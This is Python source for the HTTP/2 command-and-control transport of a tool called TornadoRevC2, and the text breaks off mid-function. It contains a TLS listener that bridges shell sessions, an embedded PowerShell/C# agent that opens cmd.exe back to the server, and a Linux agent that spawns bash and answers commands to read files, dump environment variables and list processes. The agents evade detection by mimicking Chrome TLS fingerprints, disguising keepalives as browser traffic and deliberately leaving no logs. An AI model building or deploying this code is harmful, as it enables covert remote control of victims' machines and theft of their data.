"""
HTTP/2 secondary transport for TornadoRevC2.

The listener terminates HTTP/2 over TLS on a dedicated port. Each POST to
/c2/<token> opens a bidirectional bridge that the handler attaches to an
existing reverse/bind shell session identified by <token>. Once attached,
the HTTP/2 bridge and the original shell socket are interchangeable —
whichever transport is marked 'active' receives commands.

Requires: h2 (pip install h2)
Target:   PowerShell 7+ / .NET Core 3.1+ (HTTP/2 client support)
"""

import socket
import ssl
import threading
import time

try:
    import h2.config
    import h2.connection
    import h2.events
    _H2_AVAILABLE = True
except ImportError:
    _H2_AVAILABLE = False


class Http2SessionSocket:
    """Socket-shaped adapter over a single HTTP/2 stream."""

    def __init__(self, h2_conn, stream_id, tls_sock, peer_addr, send_lock):
        self.h2_conn   = h2_conn
        self.stream_id = stream_id
        self.tls_sock  = tls_sock
        self.peer_addr = peer_addr
        self.send_lock = send_lock
        self.rfd, self.wfd = socket.socketpair()
        self.closed = False
        self._hdr_sent = False

    def fileno(self):
        return self.rfd.fileno()

    def getpeername(self):
        return self.peer_addr

    def setsockopt(self, *args, **kwargs):
        pass

    def sendall(self, data: bytes):
        if self.closed:
            raise OSError("http2 stream closed")
        if not data:
            return
        view     = memoryview(data)
        offset   = 0
        deadline = time.time() + 60.0   # budget for flow-control stalls

        while offset < len(view):
            progressed = False

            # Acquire the SAME lock the listener uses for receive_data().
            # Do NOT sleep while holding it — the listener needs this lock
            # to process incoming WINDOW_UPDATE frames, which are what
            # unblocks us when the peer's flow-control window is full.
            with self.send_lock:
                if self.closed:
                    raise OSError("http2 stream closed")

                if not self._hdr_sent:
                    self.h2_conn.send_headers(
                        self.stream_id,
                        [(b':status', b'200'),
                         (b'content-type', b'application/octet-stream')],
                        end_stream=False,
                    )
                    self._hdr_sent = True

                try:
                    window = self.h2_conn.local_flow_control_window(
                        self.stream_id)
                except Exception as e:
                    raise OSError("http2 flow-control query failed: %r" % (e,))

                # Respect BOTH the peer's max frame size (default 16384,
                # negotiated via SETTINGS) and the current flow-control
                # window. A single send_data() must not exceed either.
                frame_max = self.h2_conn.max_outbound_frame_size
                n = min(len(view) - offset, window, frame_max)

                if n > 0:
                    self.h2_conn.send_data(
                        self.stream_id,
                        bytes(view[offset:offset + n]),
                        end_stream=False,
                    )
                    try:
                        self.tls_sock.sendall(self.h2_conn.data_to_send())
                    except Exception as e:
                        self.closed = True
                        raise OSError("http2 send failed: %r" % (e,))
                    offset += n
                    progressed = True

            if not progressed:
                if time.time() > deadline:
                    raise OSError("http2 flow-control window stalled")
                # Release lock, let the listener thread receive
                # WINDOW_UPDATEs, then retry.
                time.sleep(0.05)

    def recv(self, n: int) -> bytes:
        if self.closed:
            return b''
        try:
            return self.rfd.recv(n)
        except Exception:
            return b''

    def shutdown(self, how):
        self.close()

    def close(self):
        # Take the same lock the sendall() path uses. close() mutates the
        # shared H2Connection (end_stream + data_to_send), and hyper-h2 is
        # not thread-safe — racing close() with a concurrent sendall()
        # corrupts the HPACK state. The socketpair teardown is done
        # outside the lock so we never block a plugin on fd cleanup.
        with self.send_lock:
            if self.closed:
                return
            self.closed = True
            try:
                self.h2_conn.end_stream(self.stream_id)
                self.tls_sock.sendall(self.h2_conn.data_to_send())
            except Exception:
                pass
        for s in (self.rfd, self.wfd):
            try:
                s.close()
            except Exception:
                pass

    def feed(self, data: bytes):
        if self.closed or not data:
            return
        try:
            self.wfd.setblocking(False)
        except Exception:
            pass
        sent = 0
        while sent < len(data):
            try:
                n = self.wfd.send(data[sent:])
                if n <= 0:
                    break
                sent += n
            except BlockingIOError:
                break
            except Exception:
                # Do NOT mark the stream closed here. A transient write
                # error on the socketpair must not poison the bridge —
                # otherwise the next sendall() raises OSError and the
                # caller calls cleanup_client() with reason 'unknown'.
                # Just drop the overflow and keep the stream alive.
                return

    def reset(self):
        self.closed = True
        for s in (self.rfd, self.wfd):
            try:
                s.close()
            except Exception:
                pass


class Http2Listener:

    def __init__(self, handler, host, port, certfile, keyfile):
        self.handler  = handler
        self.host     = host
        self.port     = port
        self.certfile = certfile
        self.keyfile  = keyfile
        self.sock     = None
        self._ctx     = None
        self.running  = False

    def start(self):
        if not _H2_AVAILABLE:
            print("[H2] 'h2' package not installed — install with: pip install h2")
            return False

        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(self.certfile, self.keyfile)
        ctx.set_alpn_protocols(['h2', 'http/1.1'])
        ctx.minimum_version = ssl.TLSVersion.TLSv1_2
        try:
            ctx.maximum_version = ssl.TLSVersion.TLSv1_3
        except AttributeError:
            pass
        ctx.set_ciphers(
            "ECDHE-ECDSA-AES256-GCM-SHA384:"
            "ECDHE-RSA-AES256-GCM-SHA384:"
            "ECDHE-ECDSA-AES128-GCM-SHA256:"
            "ECDHE-RSA-AES128-GCM-SHA256:"
            "ECDHE-ECDSA-CHACHA20-POLY1305:"
            "ECDHE-RSA-CHACHA20-POLY1305"
        )
        ctx.options |= ssl.OP_NO_COMPRESSION
        ctx.options |= ssl.OP_NO_RENEGOTIATION
        ctx.options |= ssl.OP_CIPHER_SERVER_PREFERENCE
        try:
            ctx.options &= ~ssl.OP_NO_TICKET
        except Exception:
            pass
        try:
            ctx.num_tickets = 4
        except Exception:
            pass
        try:
            ctx.set_ecdh_curve("X25519")
        except ssl.SSLError:
            ctx.set_ecdh_curve("prime256v1")

        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((self.host, self.port))
        self.sock.listen(100)
        self._ctx = ctx
        self.running = True
        threading.Thread(target=self._accept_loop, daemon=True).start()
        return True

    def stop(self):
        self.running = False
        if self.sock is not None:
            try:
                self.sock.shutdown(socket.SHUT_RDWR)
            except OSError:
                pass
            try:
                self.sock.close()
            except OSError:
                pass

    def _accept_loop(self):
        while self.running:
            try:
                raw, addr = self.sock.accept()
            except Exception:
                break
            try:
                tls = self._ctx.wrap_socket(raw, server_side=True)
            except Exception:
                try:
                    raw.close()
                except Exception:
                    pass
                continue
            alpn = tls.selected_alpn_protocol()
            if alpn == 'h2':
                threading.Thread(
                    target=self._handle_connection,
                    args=(tls, addr),
                    daemon=True,
                ).start()
            elif alpn in ('http/1.1', None):
                # PS 5.1 HttpWebRequest will negotiate http/1.1 or send
                # no ALPN at all. Handle both as HTTP/1.1.
                threading.Thread(
                    target=self._handle_http1,
                    args=(tls, addr),
                    daemon=True,
                ).start()
            else:
                try:
                    tls.close()
                except Exception:
                    pass

    def _handle_connection(self, tls_sock, addr):
        cfg = h2.config.H2Configuration(client_side=False, header_encoding='utf-8')
        conn = h2.connection.H2Connection(config=cfg)
        conn.initiate_connection()
        try:
            tls_sock.sendall(conn.data_to_send())
        except Exception:
            return

        # hyper-h2 is NOT thread-safe. The listener thread calls
        # receive_data() while plugin threads call send_data() through
        # Http2SessionSocket.sendall. Both must be serialized by the
        # same lock, or internal stream state gets corrupted and the
        # next send_data() raises FlowControlError / ProtocolError.
        conn_lock = threading.Lock()
        bridges = {}

        try:
            while self.running:
                try:
                    data = tls_sock.recv(65536)
                except Exception:
                    break
                if not data:
                    break

                with conn_lock:
                    try:
                        events = conn.receive_data(data)
                    except Exception:
                        break

                    for ev in events:
                        if isinstance(ev, h2.events.RequestReceived):
                            hdrs = {k: v for k, v in ev.headers}
                            path   = hdrs.get(':path', '/')
                            method = hdrs.get(':method', 'GET')

                            # Path is /c2/<token>?s=<hmac>. Strip the query
                            # first, then split the path. Verify the HMAC
                            # before dispatching to the handler — this
                            # prevents token enumeration from hijacking an
                            # existing session's stream.
                            from urllib.parse import urlsplit as _us
                            parts = _us(path)
                            token = None
                            presented = ''
                            # Extract the token from the last non-empty
                            # path segment. Works regardless of what URI
                            # prefix the malleable profile uses.
                            if method == 'POST':
                                segments = [s for s in (parts.path or '').split('/') if s]
                                if segments:
                                    token = segments[-1]
                                    for kv in (parts.query or '').split('&'):
                                        if kv.startswith('s='):
                                            presented = kv[2:]
                                            break
                            # Reject tokens whose proof does not verify.
                            # We already hold conn_lock here — do NOT
                            # re-acquire it (deadlock) and do not
                            # reference send_lock (undefined in this
                            # scope). The trailing data_to_send() flush
                            # at the end of the event loop will carry
                            # the headers out.
                            #
                            # `continue` is critical: a second
                            # send_headers() on an end_stream'd stream
                            # raises StreamClosedError in hyper-h2, and
                            # that exception would tear down the entire
                            # connection (killing every other bridge on
                            # it). Skip to the next event instead.
                            if token and not self.handler._h2_verify_token(token, presented):
                                conn.send_headers(
                                    ev.stream_id,
                                    [(b':status', b'404')],
                                    end_stream=True,
                                )
                                continue

                            if token:
                                bridge = Http2SessionSocket(
                                    conn, ev.stream_id, tls_sock, addr, conn_lock,
                                )
                                bridges[ev.stream_id] = bridge
                                # attach_http2_transport only takes
                                # self.client_lock; no deadlock with conn_lock.
                                try:
                                    self.handler.attach_http2_transport(
                                        bridge, addr, token,
                                    )
                                except Exception:
                                    try:
                                        bridge.close()
                                    except Exception:
                                        pass
                            else:
                                conn.send_headers(
                                    ev.stream_id,
                                    [(b':status', b'404')],
                                    end_stream=True,
                                )

                        elif isinstance(ev, h2.events.DataReceived):
                            bridge = bridges.get(ev.stream_id)
                            if bridge is not None:
                                # Strip the null-byte padding the Linux
                                # agent adds to short frames so the shell
                                # receives only real command data.
                                payload = ev.data
                                if payload.endswith(b'\x00'):
                                    payload = payload.rstrip(b'\x00')
                                if payload:
                                    bridge.feed(payload)
                            try:
                                conn.acknowledge_received_data(
                                    ev.flow_controlled_length, ev.stream_id,
                                )
                            except Exception:
                                pass

                        elif isinstance(ev, h2.events.StreamEnded):
                            bridge = bridges.pop(ev.stream_id, None)
                            if bridge is not None:
                                info = self.handler._client_info(bridge)
                                if info is not None:
                                    info['_last_h2_close_reason'] = 'stream_ended'
                                bridge.reset()
                                try:
                                    self.handler.cleanup_client(bridge)
                                except Exception:
                                    pass

                        elif isinstance(ev, h2.events.StreamReset):
                            bridge = bridges.pop(ev.stream_id, None)
                            if bridge is not None:
                                info = self.handler._client_info(bridge)
                                if info is not None:
                                    info['_last_h2_close_reason'] = 'stream_reset'
                                bridge.reset()
                                try:
                                    self.handler.cleanup_client(bridge)
                                except Exception:
                                    pass

                        elif isinstance(ev, h2.events.ConnectionTerminated):
                            return

                        elif isinstance(ev, h2.events.PingReceived):
                            try:
                                conn.ping(ev.ping_data, ack=True)
                            except Exception:
                                pass

                    try:
                        out = conn.data_to_send()
                        if out:
                            tls_sock.sendall(out)
                    except Exception:
                        break
        finally:
            for b in bridges.values():
                info = self.handler._client_info(b)
                if info is not None:
                    info.setdefault('_last_h2_close_reason', 'connection_teardown')
                b.reset()
                try:
                    self.handler.cleanup_client(b)
                except Exception:
                    pass
            try:
                tls_sock.close()
            except Exception:
                pass

class Http1SessionSocket:
    """Socket-shaped adapter over an HTTP/1.1 chunked request/response."""

    def __init__(self, tls_sock, peer_addr, send_lock):
        self.tls_sock  = tls_sock
        self.peer_addr = peer_addr
        self.send_lock = send_lock
        self.rfd, self.wfd = socket.socketpair()
        self.closed = False
        self._hdr_sent = False

    def fileno(self):
        return self.rfd.fileno()

    def getpeername(self):
        return self.peer_addr

    def setsockopt(self, *args, **kwargs):
        pass

    def sendall(self, data: bytes):
        if self.closed:
            raise OSError("http1 stream closed")
        if not data:
            return
        with self.send_lock:
            if not self._hdr_sent:
                self.tls_sock.sendall(
                    b'HTTP/1.1 200 OK\r\n'
                    b'Transfer-Encoding: chunked\r\n'
                    b'Content-Type: application/octet-stream\r\n'
                    b'Cache-Control: no-cache\r\n'
                    b'Connection: keep-alive\r\n\r\n'
                )
                self._hdr_sent = True
            chunk = f"{len(data):x}\r\n".encode('ascii') + data + b"\r\n"
            self.tls_sock.sendall(chunk)

    def recv(self, n: int) -> bytes:
        if self.closed:
            return b''
        try:
            return self.rfd.recv(n)
        except Exception:
            return b''

    def shutdown(self, how):
        self.close()

    def close(self):
        if self.closed:
            return
        self.closed = True
        try:
            if self._hdr_sent:
                self.tls_sock.sendall(b"0\r\n\r\n")
        except Exception:
            pass
        for s in (self.rfd, self.wfd):
            try:
                s.close()
            except Exception:
                pass

    def feed(self, data: bytes):
        if self.closed or not data:
            return
        # Non-blocking send with a bounded buffer. If the peer is slow
        # to read and the socketpair fills up, we drop the new data
        # rather than block the entire HTTP/2 connection thread.
        try:
            self.wfd.setblocking(False)
        except Exception:
            pass
        sent = 0
        while sent < len(data):
            try:
                n = self.wfd.send(data[sent:])
                if n <= 0:
                    break
                sent += n
            except BlockingIOError:
                break
            except Exception:
                self.closed = True
                return

    def reset(self):
        self.closed = True
        for s in (self.rfd, self.wfd):
            try:
                s.close()
            except Exception:
                pass


def _consume_chunked_body(sock, initial, bridge):
    """Read an HTTP/1.1 chunked request body and feed it into the bridge."""
    buf = bytearray(initial)

    def _more():
        try:
            d = sock.recv(65536)
        except Exception:
            return False
        if not d:
            return False
        buf.extend(d)
        return True

    while True:
        nl = buf.find(b'\r\n')
        while nl < 0:
            if not _more():
                return
            nl = buf.find(b'\r\n')
        size_hex = bytes(buf[:nl]).split(b';')[0].strip()
        del buf[:nl + 2]
        try:
            size = int(size_hex, 16)
        except ValueError:
            return
        if size == 0:
            while len(buf) < 2:
                if not _more():
                    return
            del buf[:2]
            return
        while len(buf) < size + 2:
            if not _more():
                return
        bridge.feed(bytes(buf[:size]))
        del buf[:size + 2]


# Monkey-patch the HTTP/1.1 handler onto Http2Listener.
def _handle_http1(self, tls_sock, addr):
    try:
        buf = bytearray()
        end = -1
        while end < 0:
            d = tls_sock.recv(4096)
            if not d:
                return
            buf.extend(d)
            end = buf.find(b'\r\n\r\n')
            if len(buf) > 65536:
                return

        head = bytes(buf[:end])
        initial = bytes(buf[end + 4:])
        lines = head.split(b'\r\n')
        if not lines:
            return
        parts = lines[0].decode('ascii', 'replace').split(' ')
        if len(parts) < 3:
            return
        method, path, _ = parts

        if method != 'POST':
            tls_sock.sendall(b'HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\n\r\n')
            return

        from urllib.parse import urlsplit as _us
        url = _us(path)
        # Extract the token from the last non-empty path segment,
        # matching the HTTP/2 handler. Supports any malleable profile
        # URI pattern, not just the default /c2/<token>.
        segments = [s for s in (url.path or '').split('/') if s]
        if not segments:
            tls_sock.sendall(b'HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\n\r\n')
            return
        token = segments[-1]
        presented = ''
        for kv in (url.query or '').split('&'):
            if kv.startswith('s='):
                presented = kv[2:]
                break

        if not self.handler._h2_verify_token(token, presented):
            tls_sock.sendall(b'HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\n\r\n')
            return
        send_lock = threading.Lock()
        bridge = Http1SessionSocket(tls_sock, addr, send_lock)

        def _body_reader():
            try:
                _consume_chunked_body(tls_sock, initial, bridge)
            finally:
                bridge.reset()

        threading.Thread(target=_body_reader, daemon=True).start()

        try:
            self.handler.attach_http2_transport(bridge, addr, token)
        except Exception:
            try:
                bridge.close()
            except Exception:
                pass
    except Exception:
        pass


Http2Listener._handle_http1 = _handle_http1

HTTP2_AGENT_TEMPLATE = r'''
$ErrorActionPreference = 'SilentlyContinue'
$Url = '__H2_URL__'
$KillDeadline = __H2_KILL__

$__agent_code = @'
$ErrorActionPreference = 'Stop'
$KillDeadline = __H2_KILL__
Add-Type -TypeDefinition @"
using System;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Threading.Tasks;

public static class H2Pipe {
    public class BlockingStream : Stream {
        private readonly System.Collections.Concurrent.BlockingCollection<byte[]> _q
            = new System.Collections.Concurrent.BlockingCollection<byte[]>();
        private byte[] _cur; private int _pos;
        public override bool CanRead => true;
        public override bool CanSeek => false;
        public override bool CanWrite => true;
        public override long Length => throw new NotSupportedException();
        public override long Position { get => 0; set => throw new NotSupportedException(); }
        public override void Flush() { }
        public override long Seek(long o, SeekOrigin s) => throw new NotSupportedException();
        public override void SetLength(long v) => throw new NotSupportedException();
        public override int Read(byte[] buf, int off, int len) {
            if (_cur == null || _pos >= _cur.Length) { _cur = _q.Take(); _pos = 0; }
            int n = Math.Min(len, _cur.Length - _pos);
            Array.Copy(_cur, _pos, buf, off, n);
            _pos += n;
            return n;
        }
        public override void Write(byte[] buf, int off, int len) {
            byte[] c = new byte[len];
            Array.Copy(buf, off, c, 0, len);
            _q.Add(c);
        }
    }

    // Public key for ECDSA verification. Populated by the handler at
    // build time. Empty string disables verification.
    public static string SignPublicPem = "__H2_SIGN_PUB__";

    static bool VerifySigned(byte[] envelope, out byte[] payload) {
        payload = null;
        if (string.IsNullOrEmpty(SignPublicPem)) {
            payload = envelope;
            return true;   // verification disabled
        }
        int colon = Array.IndexOf(envelope, (byte)':');
        if (colon <= 0) return false;
        var sigB64 = System.Text.Encoding.ASCII.GetString(envelope, 0, colon);
        var payB64 = System.Text.Encoding.ASCII.GetString(
            envelope, colon + 1, envelope.Length - colon - 1);
        try {
            var sig = Convert.FromBase64String(sigB64);
            payload = Convert.FromBase64String(payB64);
            using (var ecdsa = System.Security.Cryptography.ECDsa.Create()) {
                ecdsa.ImportFromPem(SignPublicPem);
                return ecdsa.VerifyData(
                    payload, sig,
                    System.Security.Cryptography.HashAlgorithmName.SHA256);
            }
        } catch { return false; }
    }

    public static async Task Run(string url) {
        var handler = new HttpClientHandler {
            ServerCertificateCustomValidationCallback = (m, c, ch, e) => true,
        };
        using var client = new HttpClient(handler) {
            DefaultRequestVersion = HttpVersion.Version20,
            DefaultVersionPolicy  = HttpVersionPolicy.RequestVersionExact,
            Timeout = System.Threading.Timeout.InfiniteTimeSpan,
        };
        client.DefaultRequestHeaders.Add("User-Agent", "__H2_UA__");

        var up = new BlockingStream();
        var content = new StreamContent(up);
        var request = new HttpRequestMessage(HttpMethod.Post, url) { Content = content };
        var response = await client.SendAsync(
            request, HttpCompletionOption.ResponseHeadersRead);
        response.EnsureSuccessStatusCode();
        var down = await response.Content.ReadAsStreamAsync();

        var psi = new System.Diagnostics.ProcessStartInfo {
            FileName = "cmd.exe",
            UseShellExecute = false,
            RedirectStandardInput  = true,
            RedirectStandardOutput = true,
            RedirectStandardError  = true,
            CreateNoWindow = true,
        };
        var proc = System.Diagnostics.Process.Start(psi);

        var t1 = Task.Run(async () => {
            // Incoming bytes are a stream of newline-terminated
            // envelopes: <b64sig>:<b64payload>\n. Reject any line that
            // does not verify before forwarding to shell stdin.
            var acc = new System.Collections.Generic.List<byte>(4096);
            var buf = new byte[4096]; int n;
            while ((n = await down.ReadAsync(buf, 0, buf.Length)) > 0) {
                for (int i = 0; i < n; i++) {
                    if (buf[i] == (byte)'\n') {
                        var env = acc.ToArray();
                        acc.Clear();
                        byte[] verified;
                        if (VerifySigned(env, out verified) && verified != null) {
                            await proc.StandardInput.BaseStream.WriteAsync(
                                verified, 0, verified.Length);
                            await proc.StandardInput.BaseStream.WriteAsync(
                                new byte[]{(byte)'\n'}, 0, 1);
                            await proc.StandardInput.BaseStream.FlushAsync();
                        }
                        // Dropped: signature invalid.
                    } else {
                        acc.Add(buf[i]);
                    }
                }
            }
        });
        var t2 = Task.Run(async () => {
            var buf = new byte[4096]; int n;
            while ((n = await proc.StandardOutput.BaseStream.ReadAsync(buf, 0, buf.Length)) > 0)
                up.Write(buf, 0, n);
        });
        var t3 = Task.Run(async () => {
            var buf = new byte[4096]; int n;
            while ((n = await proc.StandardError.BaseStream.ReadAsync(buf, 0, buf.Length)) > 0)
                up.Write(buf, 0, n);
        });
        await Task.WhenAll(t1, t2, t3);
    }
}
"@ -Language CSharp

# Kill date enforcement — a background runspace terminates the agent
# when the deadline passes. Independent of the shell's lifecycle.
$killer = [PowerShell]::Create()
[void]$killer.AddScript(@"
while ((Get-Date -UFormat %s) -lt $KillDeadline) { Start-Sleep -Seconds 30 }
Stop-Process -Id `$PID -Force -ErrorAction SilentlyContinue
"@)
[void]$killer.BeginInvoke()

[H2Pipe]::Run('__H2_URL__').GetAwaiter().GetResult()
'@

# Launch the agent as a detached background job so the shell
# returns to its prompt immediately.
$__job = Start-Job -ScriptBlock ([ScriptBlock]::Create($__agent_code)) `
    -ErrorAction SilentlyContinue

if ($__job) {
    Write-Output ('H2_LAUNCHED:' + $__job.Id)
} else {
    Write-Output 'H2_LAUNCH_FAILED'
}
'''

HTTP2_AGENT_LINUX_PY = r'''
import base64, json, os, queue, random, signal, socket, ssl, struct, subprocess, sys, threading, time

HOST = "__H2_HOST__"
PORT = __H2_PORT__
PATH = "__H2_PATH__"
# Absolute epoch seconds. Past this point the agent terminates itself
# unconditionally, whether or not the handler is reachable.
KILL_DEADLINE = __H2_KILL__

try:
    signal.signal(signal.SIGPIPE, signal.SIG_IGN)
except Exception:
    pass

MODE = "h2"
try:
    import h2.config, h2.connection, h2.events
except ImportError:
    try:
        subprocess.run(
            [sys.executable, "-m", "pip", "install", "--quiet", "--user", "h2"],
            check=False, timeout=60,
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
        import h2.config, h2.connection, h2.events
    except Exception:
        MODE = "h1"


def _spawn_shell():
    return subprocess.Popen(
        ["/bin/bash", "--noprofile", "--norc"],
        stdin=subprocess.PIPE, stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT, bufsize=0,
        start_new_session=True,
    )


def _shutdown_socket(sock):
    try:
        sock.shutdown(socket.SHUT_RDWR)
    except Exception:
        pass
    try:
        sock.close()
    except Exception:
        pass


def _log(reason):
    # Intentionally a no-op. Nothing is written to disk — no /tmp log
    # file, no forensic artifact. Every call site is preserved so the
    # code stays readable.
    pass


# ------------------------------------------------------------------ h2 path

def run_h2():
    cfg = h2.config.H2Configuration(client_side=True, header_encoding="utf-8")
    conn = h2.connection.H2Connection(config=cfg)

    raw = socket.create_connection((HOST, PORT), timeout=30)
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    # Best-effort Chrome cipher match. JA3 also hashes the extension
    # list, which Python's stdlib ssl cannot control, so this reduces
    # the mismatch but does not eliminate it. A true Chrome JA3 needs
    # a client built on BoringSSL (curl_cffi, or a vendored binding).
    try:
        ctx.set_ciphers(
            "ECDHE-ECDSA-AES128-GCM-SHA256:"
            "ECDHE-RSA-AES128-GCM-SHA256:"
            "ECDHE-ECDSA-AES256-GCM-SHA384:"
            "ECDHE-RSA-AES256-GCM-SHA384:"
            "ECDHE-ECDSA-CHACHA20-POLY1305:"
            "ECDHE-RSA-CHACHA20-POLY1305:"
            "ECDHE-RSA-AES128-SHA:"
            "ECDHE-RSA-AES256-SHA:"
            "AES128-GCM-SHA256:"
            "AES256-GCM-SHA384:"
            "AES128-SHA:"
            "AES256-SHA"
        )
    except Exception:
        pass
    try:
        ctx.set_ecdh_curve("X25519")
    except Exception:
        pass
    try:
        ctx.set_alpn_protocols(["h2"])
    except Exception:
        pass
    try:
        ctx.minimum_version = ssl.TLSVersion.TLSv1_2
    except Exception:
        pass
    sock = ctx.wrap_socket(raw, server_hostname=HOST)

    try:
        sock.settimeout(None)
    except Exception:
        pass
    try:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    except Exception:
        pass

    conn.initiate_connection()
    sock.sendall(conn.data_to_send())

    sid = conn.get_next_available_stream_id()
    conn.send_headers(sid, [
        (":method", "POST"), (":path", PATH),
        (":authority", HOST + ":" + str(PORT)), (":scheme", "https"),
        ("content-type", "application/octet-stream"),
        ("user-agent", "__H2_UA__"),
    ], end_stream=False)
    sock.sendall(conn.data_to_send())

    stop_evt      = threading.Event()
    h2_lock       = threading.Lock()
    last_pong     = [time.time()]

    # Kill date enforcement. This is independent of the main loop —
    # if the deadline passes, the agent exits cleanly regardless of
    # what the main loop is doing.
    def _kill_watch():
        while not stop_evt.is_set():
            remaining = KILL_DEADLINE - time.time()
            if remaining <= 0:
                _log("kill date reached — self-destruct")
                try:
                    _shutdown_socket(sock)
                except Exception:
                    pass
                stop_evt.set()
                return
            stop_evt.wait(min(30.0, remaining))

    threading.Thread(target=_kill_watch, daemon=True).start()

    # HTTP/2 keepalive. Sends a PING every 30-45 s (jittered). If the
    # server never responds, the agent terminates — matching the
    # behaviour of real browser clients, which detect a dead HTTP/2
    # connection on missing PING acks. PING frames are indistinguishable
    # from Chrome/Firefox keepalive on the wire.
    def _keepalive():
        while not stop_evt.is_set():
            stop_evt.wait(random.uniform(30.0, 45.0))
            if stop_evt.is_set():
                return
            try:
                with h2_lock:
                    conn.ping(b"\x00" * 8)
                    sock.sendall(conn.data_to_send())
            except Exception:
                return
            # Terminate if we haven't seen a PING ack in 2× the interval.
            if time.time() - last_pong[0] > 90.0:
                _log("keepalive lost — self-destruct")
                try:
                    _shutdown_socket(sock)
                except Exception:
                    pass
                stop_evt.set()
                return

    threading.Thread(target=_keepalive, daemon=True).start()
    pending_out   = []
    window_updated = threading.Event()

    # ---- shell lifecycle: reader + writer threads share this state ------
    shell_state      = {'proc': None}
    shell_spawn_lock = threading.Lock()
    stdin_q          = queue.Queue(maxsize=8192)

    # ------------------------------------------------------------------
    # In-process command dispatcher.
    #
    # Lines starting with `__` are handled by the agent itself, without
    # spawning a shell. Everything else falls through to bash.
    #
    # Supported verbs:
    #   __rd <path>        → base64 of file contents
    #   __ls <path>        → JSON list of {name,type,size,mode}
    #   __env              → JSON dict of environment
    #   __ps               → JSON list of {pid,comm,cmd}
    #
    # Results stream back through pending_out, the same path used for
    # shell output, so the handler needs no special transport logic.
    # ------------------------------------------------------------------
    dispatch_buf = bytearray()

    def _inproc_reply(payload: bytes):
        with h2_lock:
            pending_out.append(payload)
            _drain_out()

    def _handle_inproc(line: bytes):
        try:
            parts = line.decode('utf-8', errors='replace').split(None, 1)
            verb = parts[0]
            arg = parts[1].strip() if len(parts) > 1 else ''

            if verb == '__rd':
                if not arg:
                    _inproc_reply(b'error: __rd requires a path\n')
                    return
                with open(arg, 'rb') as f:
                    data = f.read()
                _inproc_reply(base64.b64encode(data) + b'\n')
                return

            if verb == '__ls':
                target = arg or '.'
                entries = []
                for name in sorted(os.listdir(target)):
                    full = os.path.join(target, name)
                    try:
                        st = os.stat(full)
                        entries.append({
                            'name': name,
                            'type': 'dir' if os.path.isdir(full) else 'file',
                            'size': st.st_size,
                            'mode': oct(st.st_mode & 0o7777),
                        })
                    except Exception:
                        entries.append({'name': name, 'type': 'unknown'})
                _inproc_reply(json.dumps(entries).encode() + b'\n')
                return

            if verb == '__env':
                _inproc_reply(json.dumps(dict(os.environ)).encode() + b'\n')
                return

            if verb == '__ps':
                procs = []
                for pid in os.listdir('/proc'):
                    if not pid.isdigit():
                        continue
                    try:
                        with open('/proc/%s/cmdline' % pid, 'rb') as f:
                            cmdline = f.read().replace(b'\x00', b' ').strip().decode('utf-8', 'replace')
                        with open('/proc/%s/comm' % pid, 'r') as f:
                            comm = f.read().strip()
                        procs.append({'pid': int(pid), 'comm': comm, 'cmd': cmdline})
                    except Exception:
                        pass
                _inproc_reply(json.dumps(procs).encode() + b'\n')
                return

            if verb == '__pwd':
                _inproc_reply(os.getcwd().encode() + b'\n')
                return

            if verb == '__whoami':
                try:
                    import pwd
                    name = pwd.getpwuid(os.getuid()).pw_name
                except Exception:
                    name = os.environ.get('USER') or os.environ.get('LOGNAME') or ''
                _inproc_reply(name.encode() + b'\n')
                return

            if verb == '__id':
                try:
                    import pwd, grp
                    u = pwd.getpwuid(os.getuid())
                    g = grp.getgrgid(os.getgid())
                    groups = os.getgroups()
                    line = (f"uid={os.getuid()}({u.pw_name}) "
                            f"gid={os.getgid()}({g.gr_name}) "
                            f"groups={','.join(str(x) for x in groups)}")
                except Exception:
                    line = f"uid={os.getuid()} gid={os.getgid()}"
                _inproc_reply(line.encode() + b'\n')
                return

            if verb == '__hostname':
                _inproc_reply(socket.gethostname().encode() + b'\n')
                return

            if verb == '__uname':
                try:
                    u = os.uname()
                    line = f"{u.sysname} {u.nodename} {u.release} {u.version} {u.machine}"
                except Exception:
                    line = 'unknown'
                _inproc_reply(line.encode() + b'\n')
                return

            _inproc_reply(('error: unknown verb %s\n' % verb).encode())
        except Exception as exc:
            try:
                _inproc_reply(('error: %r\n' % exc).encode())
            except Exception:
                pass

    def _dispatch_incoming(data: bytes):
        """Feed bytes into the dispatcher. Splits on newlines; __-prefixed
        lines go to the in-process handler, everything else to the shell."""
        dispatch_buf.extend(data)
        while True:
            nl = dispatch_buf.find(b'\n')
            if nl < 0:
                return
            line = bytes(dispatch_buf[:nl + 1])
            del dispatch_buf[:nl + 1]
            stripped = line.rstrip(b'\r\n')
            if stripped.startswith(b'__'):
                _handle_inproc(stripped)
            else:
                try:
                    stdin_q.put_nowait(line)
                except queue.Full:
                    _log("stdin_q full — dropping %d bytes" % len(line))

    def _spawn_shell_locked():
        proc = _spawn_shell()
        shell_state['proc'] = proc
        threading.Thread(
            target=shell_reader, args=(proc,), daemon=True,
        ).start()
        return proc

    def _ensure_shell():
        with shell_spawn_lock:
            proc = shell_state['proc']
            if proc is None or proc.poll() is not None:
                rc = None if proc is None else proc.poll()
                _spawn_shell_locked()
            return shell_state['proc']

    def shell_writer():
        """Drain stdin_q into the current shell. This is the ONLY place
        that ever writes to shell stdin. If the write fails, respawn."""
        while not stop_evt.is_set():
            try:
                data = stdin_q.get(timeout=0.5)
            except queue.Empty:
                continue
            if data is None:
                return
            while not stop_evt.is_set():
                proc = _ensure_shell()
                try:
                    proc.stdin.write(data)
                    proc.stdin.flush()
                    break
                except Exception as e:
                    with shell_spawn_lock:
                        if shell_state['proc'] is proc:
                            try:
                                proc.terminate()
                            except Exception:
                                pass
                            shell_state['proc'] = None
                    time.sleep(0.2)

    def _drain_out():
        while pending_out and not stop_evt.is_set():
            try:
                window = conn.local_flow_control_window(sid)
            except Exception as e:
                stop_evt.set()
                return
